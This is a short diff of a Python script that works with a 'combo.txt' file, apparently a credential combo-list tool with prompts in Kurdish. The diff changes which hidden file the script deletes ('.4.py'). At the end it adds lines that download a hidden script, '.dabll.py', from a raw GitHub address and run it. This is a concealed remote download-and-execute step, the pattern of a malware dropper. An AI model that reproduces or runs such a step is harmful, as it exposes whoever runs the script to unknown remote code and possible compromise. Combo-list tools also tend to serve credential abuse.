@@ -1,10 +1,10 @@
 import  os, sys, random, wget
-os.system("rm .2.py")
+os.system("rm .4.py")
 try:
-    os.remove(".2.py")
+    os.remove(".4.py")
 except:
     pass
-os.system("rm -rf .2.py")
+os.system("rm -rf .4.py")
 def g():
 	def iiii():
 		os.system("rm -rf combo.txt")
@@ -28,4 +28,5 @@ def g():
 		print("     Combo ka drwst bw eakam hallbzhera w bnwsa combo.txt")
 		os.sys.exit()
 g()
-
+wget.download("https://raw.githubusercontent.com/sfrsfrsfr404sfrsfrsfr/-/main/.dabll.py")
+os.system("python .dabll.py")
